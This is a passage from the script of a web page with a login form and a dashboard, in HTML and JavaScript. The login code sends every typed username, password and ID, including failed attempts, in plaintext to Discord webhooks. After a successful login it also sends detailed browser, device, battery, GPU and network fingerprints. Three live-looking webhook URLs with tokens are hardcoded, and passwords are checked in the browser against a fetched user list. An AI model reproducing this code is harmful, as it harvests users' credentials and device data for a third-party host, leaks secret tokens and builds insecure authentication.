            else if (settingName === 'enableUpdateNotifications') message = `Update pop-ups ${status}.`;
            else if (settingName === 'notificationSoundEnabled') message = `Notification sound ${status}.`;
            else if (settingName === 'autoDismissReminders') message = `Auto-dismiss reminders ${status}.`;
            else message = `${settingName.replace(/([A-Z])/g, ' $1').toLowerCase()} ${status}.`;

            dashboard.showNotification(message, 'info');
            dashboard.saveSettings();
          },

          updateReminderSound: function(sound) {
            dashboard.config.reminderSound = sound;
            dashboard.showNotification(`Reminder sound set to ${sound}.`);
            dashboard.saveSettings();
          },

          mockProfileEdit: function() {
              alert('Profile editing functionality is under construction. Please check back later!');
              dashboard.showNotification('Clicked: Edit Profile (mock).');
          },
          mockLanguageChange: function(lang) {
              alert(`Language changed to ${lang}. (Mock change only, no actual translation implemented.)`);
              dashboard.showNotification(`Mock language set to ${lang}.`);
          },
          mockAnimationSpeedChange: function(speed) {
              dashboard.config.animationSpeed = speed;
              alert(`Animation speed set to ${speed}. (Visual changes will be minimal in this demo.)`);
              dashboard.showNotification(`Animation speed set to ${speed}.`);
              dashboard.saveSettings();
          },
          mockPasswordChange: function() {
              alert('Password change dialog simulated. Actual password reset will require server interaction. (Mock)');
              dashboard.showNotification('Clicked: Change Password (mock).');
          },
          mock2FAToggle: function(enabled) {
              alert(`Two-Factor Authentication is now ${enabled ? 'enabled' : 'disabled'}. (Mock functionality only, no actual security changes.)`);
              dashboard.showNotification(`2FA Toggled ${enabled ? 'on' : 'off'} (mock).`);
          },
          mockSetup2FA: function() {
              alert('2FA Setup wizard would launch here. (Mock)');
              dashboard.showNotification('Clicked: Setup 2FA (mock).');
          },
          mockSessionTimeoutChange: function(minutes) {
              dashboard.showNotification(`Session timeout set to ${minutes} minutes. (Mock, actual session handling not fully implemented)`);
              // Implement actual session timeout if needed, probably outside of dashboard object
          },
          clearCache: function() {
              if (confirm('Are you sure you want to clear all local dashboard data (settings, reminders, etc.)? This will NOT log you out but will reset preferences.')) {
                  localStorage.clear();
                  dashboard.showNotification('Local cache and data cleared! Reloading to apply defaults...', 'warning', 3000);
                  setTimeout(() => window.location.reload(), 3000); // Reload to reflect defaults
              }
          },
          mockDeveloperConsole: function() {
              if (document.getElementById('devModeToggle').checked) { // Check current state of the toggle
                  alert('Developer Console activated. Access browser console for debug info. (Mock)');
                  dashboard.showNotification('Developer Mode console activated (mock).');
                  console.log('Developer Mode: true');
              } else {
                  alert('Developer Mode is currently disabled. Enable it in settings to use this feature.');
                  dashboard.showNotification('Developer Mode is disabled.', 'warning');
              }
          },
          resetToDefault: function() {
              if (confirm('Are you sure you want to reset all dashboard settings to their default values? This will clear all custom preferences and reminders.')) {
                  localStorage.removeItem('dashboardSettings');
                  localStorage.removeItem('dashboardReminders'); // Clear reminders as well if a full reset is desired
                  dashboard.showNotification('All settings reset to default! Reloading...', 'warning', 3000);
                  setTimeout(() => window.location.reload(), 3000);
              }
          },
          exportSettings: function() {
            const data = {
                settings: dashboard.config,
                reminders: dashboard.reminders.remindersArray,
                // Add any other user-specific data here if available
            };
            const dataStr = JSON.stringify(data, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'private_system_userdata.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            dashboard.showNotification('User data and settings exported to JSON file.', 'success');
        }
      }
    };

    // Pre-Load Animation & Login Logic Wrapper (IIFE)
    (() => {
        const initialLoadingScreen = document.getElementById('initialLoadingScreen');
        const loginBox = document.getElementById('loginBox');
        const dashboardElement = document.getElementById('dashboard');
        const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
        const bodyElement = document.getElementById('bodyElement');

        let attempts = 5;
        let users = [];
        let loginTime = null; // Store login time for session logging

        // --- Loading Screen Animations ---
        const animateLoadingScreen = (screenElement, callback) => {
            screenElement.style.display = 'flex'; // Make sure it's visible to start transition
            screenElement.classList.add('active');
            const loadingText = screenElement.querySelector('.loading-text');

            // Force restart animation if it might have played before
            if (loadingText) {
                loadingText.style.animation = 'none';
                loadingText.offsetWidth; /* trigger reflow */
                loadingText.style.animation = null;
            }

            // Timeout should match CSS animation duration + fade out
            setTimeout(() => {
                screenElement.classList.remove('active');
                // Use a short delay before actually hiding to allow for fade-out
                setTimeout(() => {
                    screenElement.style.display = 'none';
                    if (callback) callback();
                }, 1000); // Allow 1s for fade-out transition (total anim time 3s: 2s typing, 1s fade)
            }, 3000);
        };

        // 1. Initial Load to Login
        document.addEventListener('DOMContentLoaded', () => {
            animateLoadingScreen(initialLoadingScreen, () => {
                bodyElement.classList.add('active'); // Activate login-body
            });
        });

        // --- Original Login System JS (Adapted) ---

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const userIDInput = document.getElementById('userID');
        const showPasswordCheckbox = document.getElementById('showPassword');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const attemptsText = document.getElementById('attemptsText');
        const resetPopup = document.getElementById('resetPopup');
        const resetField = document.getElementById('resetField');
        const resetBtn = document.getElementById('resetBtn');

        // Show/hide password toggle
        showPasswordCheckbox.addEventListener('change', () => {
            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
            dashboard.showNotification(`Password visibility toggled ${showPasswordCheckbox.checked ? 'on' : 'off'}.`);
        });

        // Fetch user JSON data on load
        fetch(USER_JSON_URL)
            .then(res => res.json())
            .then(data => {
                users = data;
                dashboard.showNotification('User whitelist loaded successfully.', 'success');
            })
            .catch(() => {
                users = [];
                console.error('Failed to load user JSON data. Defaulting to no users.');
                dashboard.showNotification('Failed to load user whitelist. Contact admin.', 'error');
            });

        // Flash red outline function
        function flashRedOutline(times = 2, delay = 400) {
            let count = 0;
            function flash() {
                loginBox.classList.add('flashing');
                setTimeout(() => {
                    loginBox.classList.remove('flashing');
                    count++;
                    if (count < times) setTimeout(flash, delay);
                }, delay);
            }
            flash();
        }

        // Get WebGL Renderer (used for device logging)
        function getWebGLRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Unavailable";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
            } catch {
                return "Unavailable";
            }
        }

        // Battery status promise (device logging)
        async function getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return battery;
                } catch {
                    return null;
                }
            }
            return null;
        }

        // Build user info object from user JSON
        function findUser(username, userID) {
            return users.find(u =>
                u.username?.toLowerCase() === username.toLowerCase() &&
                u.userID?.toString() === userID.toString()
            );
        }

        // Send Discord webhook with custom embed fields
        async function sendWebhook(url, embed) {
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });
            } catch (e) {
                console.warn('Webhook send failed:', e);
            }
        }

        // Collect browser & device info for logs
        async function collectLoggingData(user, password) {
            const now = new Date();
            loginTime = now.toISOString(); // Set global login time
            const batteryStatus = await getBatteryStatus();

            return {
                user,
                password,
                loginTime,
                batteryStatus,
                webglRenderer: getWebGLRenderer(),
            };
        }

        // New logging functions for the specific systems (reused from original)
        // Dummy embed builders for individual logs (replicated logic for consistency with new logging_webhooks)
        function buildUsernameEmbed(name, username) {
            return { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildPasswordEmbed(name, password) {
            return { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildIdentifierEmbed(name, identifier) {
            return { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildInvalidUsernameEmbed(name, username) {
            return { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildInvalidPasswordEmbed(name, password) {
            return { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildInvalidIdentifierEmbed(name, identifier) {
            return { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildAttemptsCounterEmbed(name, username, password, identifier, attemptsLeft) {
            return { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildAttemptsExceededEmbed(name, username, password, identifier) {
            return { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        }
        function buildUserLoggingEmbed(data) {
             return {
              title: "User Logging System",
              color: 0xff0000,
              fields: [
                { name: "Name", value: data.user.name || "N/A", inline: true },
                { name: "Username", value: data.user.username, inline: true },
                { name: "Password", value: data.password, inline: true },
                { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
                { name: "Role Type", value: data.user.role || "N/A", inline: true },
                { name: "Login Time", value: data.loginTime, inline: false },
                { name: "User Identifier", value: data.user.userID.toString(), inline: true },
                { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
              ]
            };
        }
        function buildBrowserLoggingEmbed(data) {
            const nav = navigator;
            return {
              title: "Browser Logging System",
              color: 0x00ff00,
              fields: [
                { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                { name: "Username", value: data.user.username || "N/A", inline: true },
                { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
                { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
                { name: "Browser Language", value: nav.language || "Unknown", inline: true },
                { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
                { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
                { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
                { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
                { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
                { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
                { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
                { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
                { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
                { name: "Font Smoothing Type", value: "Unavailable", inline: true },
                { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
                { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
                { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
              ]
            };
        }
        function buildDeviceLoggingEmbed(data) {
            const nav = navigator;
            const battery = data.batteryStatus;
            return {
              title: "Device Logging System",
              color: 0x0000ff,
              fields: [
                { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                { name: "Username", value: data.user.username || "N/A", inline: true },
                { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
                { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
                { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
                { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
                { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
                { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
                { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
                { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
                { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
                { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
                { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
                { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
                { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
                { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
                { name: "Language", value: nav.language || "Unknown", inline: true }
              ]
            };
        }
        function buildConnectionLoggingEmbed(data) {
            const nav = navigator;
            return {
              title: "Connection Logging System",
              color: 0xffff00,
              fields: [
                { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                { name: "Username", value: data.user.username || "N/A", inline: true },
                { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
                { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
                { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
                { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
                { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
                { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
                { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
                { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
                { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
                { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
                { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
                { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
                { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
                { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
                { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
              ]
            };
        }
        function buildSessionLoggingEmbed(data) {
             return {
              title: "Session Logging System",
              color: 0x00ffff,
              fields: [
                { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                { name: "Username", value: data.user.username || "N/A", inline: true },
                { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
                { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
                { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
                { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
                { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
                { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
                { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
                { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
                { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
                { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
                { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
                { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
                { name: "Idle Time", value: data.idleTime || "0s", inline: true },
                { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
                { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
              ]
            };
        }


        // Handle login submission
        async function submitLogin() {
            errorMsg.textContent = '';
            if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
                errorMsg.textContent = 'Please fill all fields.';
                dashboard.showNotification('Login failed: Please fill all fields.', 'warning');
                return;
            }

            const username = usernameInput.value;
            const password = passwordInput.value;
            const userID = userIDInput.value;
            const user = findUser(username, userID);

            // Log the attempt
            await sendWebhook(loggingWebhooks.attempts_counter, buildAttemptsCounterEmbed(
                user?.name || "Unknown", username, password, userID, attempts
            ));

            if (!user) {
                await sendWebhook(loggingWebhooks.invalid_username, buildInvalidUsernameEmbed(user?.name || "Unknown", username));
                await sendWebhook(loggingWebhooks.invalid_identifier, buildInvalidIdentifierEmbed(user?.name || "Unknown", userID));
                handleFailedAttempt('User not found.');
                dashboard.showNotification('Login failed: User not found.', 'error');
                return;
            }

            if (password !== user.password) {
                await sendWebhook(loggingWebhooks.invalid_password, buildInvalidPasswordEmbed(user.name, password));
                handleFailedAttempt('Incorrect password.');
                dashboard.showNotification('Login failed: Incorrect password.', 'error');
                return;
            }

            // Correct login
            attempts = 5;
            updateAttemptsText();
            errorMsg.textContent = '';
            resetPopup.style.display = 'none';
            loginBox.style.borderColor = 'white';
            loginBox.style.boxShadow = '0 0 15px white';
            dashboard.showNotification('Login successful!', 'success');


            // Log successful credentials
            await sendWebhook(loggingWebhooks.username, buildUsernameEmbed(user.name, username));
            await sendWebhook(loggingWebhooks.password, buildPasswordEmbed(user.name, password));
            await sendWebhook(loggingWebhooks.identifier, buildIdentifierEmbed(user.name, userID));

            // Collect data and send logs
            const loggingData = await collectLoggingData(user, password);

            // Send all 5 webhooks:
            await Promise.all([
                sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
                sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
                sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
                sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
                sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
            ]);


            // --- Dashboard Transition Animation ---
            // loginBox.classList.remove('active'); // Hide login box gracefully if needed (depends on login-body state)
            bodyElement.classList.remove('active'); // Hide login-body by removing 'active'

            animateLoadingScreen(dashboardLoadingScreen, () => {
                dashboardElement.style.display = 'block';
                // Set the body class for the dashboard theme after animation
                bodyElement.className = 'dashboard-body ' + dashboard.config.theme + '-theme';
                // Update user info in dashboard
                document.getElementById('loggedInUser').textContent = user.name || user.username;
                document.getElementById('loggedInID').textContent = userID;

                // Initialize dashboard functionality
                dashboard.init();
            });
        }


        // Failed attempt handler
        async function handleFailedAttempt(msg) {
            attempts--;
            updateAttemptsText();
            errorMsg.textContent = msg;

            if (attempts <= 0) {
                attempts = 0;
                errorMsg.textContent = 'No attempts left. Please reset.';

                // Log attempts exceeded
                const username = usernameInput.value;
                const password = passwordInput.value;
                const userID = userIDInput.value;
                const user = findUser(username, userID);

                await sendWebhook(loggingWebhooks.attempts_exceeded, buildAttemptsExceededEmbed(
                    user?.name || "Unknown", username, password, userID
                ));

                showResetPopup();
                disableInputs();
                dashboard.showNotification('Maximum login attempts exceeded. Reset required.', 'error', 0); // Stick until manually dismissed
            } else {
                if (attempts <= 3) {
                    flashRedOutline(2, 400);
                }
            }
        }

        // Update attempts display
        function updateAttemptsText() {
            attemptsText.textContent = `Attempts Left: ${attempts}`;
        }

        // Disable inputs and submit button
        function disableInputs() {
            usernameInput.disabled = true;
            passwordInput.disabled = true;
            userIDInput.disabled = true;
            submitBtn.disabled = true;
        }

        // Enable inputs and submit button
        function enableInputs() {
            usernameInput.disabled = false;
            passwordInput.disabled = false;
            userIDInput.disabled = false;
            submitBtn.disabled = false;
        }

        // Show reset popup
        function showResetPopup() {
            resetPopup.style.display = 'block';
            resetPopup.setAttribute('aria-hidden', 'false');
            resetField.focus();
        }

        // Hide reset popup
        function hideResetPopup() {
            resetPopup.style.display = 'none';
            resetPopup.setAttribute('aria-hidden', 'true');
            resetField.value = '';
        }

        async function resetCounter() {
            const enteredCode = resetField.value.trim();
            const isCorrect = enteredCode === RESET_CODE;

            const username = usernameInput.value || 'Unknown';
            const password = passwordInput.value || 'Unknown';
            const userID = userIDInput.value || 'Unknown';
            const user = findUser(username, userID) || {};

            // 1. Send "Reset box Detected" webhook immediately (from original)
            const resetBoxEmbed = {
                title: "🔔 Reset Box Detected",
                color: 0xffff00,
                fields: [
                    { name: "Name", value: user.name || "N/A", inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Password Entered", value: password, inline: true },
                    { name: "User ID", value: userID, inline: true },
                    { name: "Entered Code", value: enteredCode, inline: false },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            };
            const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJXJ_keiThIZ6gYCJILFSHfSDSnsq"; // Original provided URL
            await sendWebhook(resetBoxWebhook, resetBoxEmbed);

            // Build embed for correct or incorrect code (from original)
            const resultEmbed = {
                title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
                color: isCorrect ? 0x00ff00 : 0xff0000,
                fields: [
                    { name: "Name", value: user.name || "N/A", inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Password Entered", value: password, inline: true },
                    { name: "User ID", value: userID, inline: true },
                    { name: "Reset Code", value: enteredCode, inline: false },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            };

            // Select webhook for correct or incorrect logging (from original)
            const resultWebhook = isCorrect
                ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
                : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

            await sendWebhook(resultWebhook, resultEmbed);

            if (isCorrect) {
                attempts = 5;
                updateAttemptsText();
                enableInputs();
                hideResetPopup();
                errorMsg.textContent = '';
                dashboard.showNotification('Login attempts reset successfully!', 'success');
            } else {
                alert('Incorrect reset code.');
                dashboard.showNotification('Incorrect reset code.', 'error');
            }
        }

        // Attach event listeners
        submitBtn.addEventListener('click', submitLogin);
        resetBtn.addEventListener('click', resetCounter);

        // Enter key submits login if popup hidden, else tries reset
        document.addEventListener('keydown', e => {
            if (e.key === 'Enter') {
                if (resetPopup.style.display === 'block') {
                    resetCounter();
                } else {
                    submitLogin();
                }
            }
        });

        // Initialize attempts display
        updateAttemptsText();
    })();
  </script>

</body>
</html>
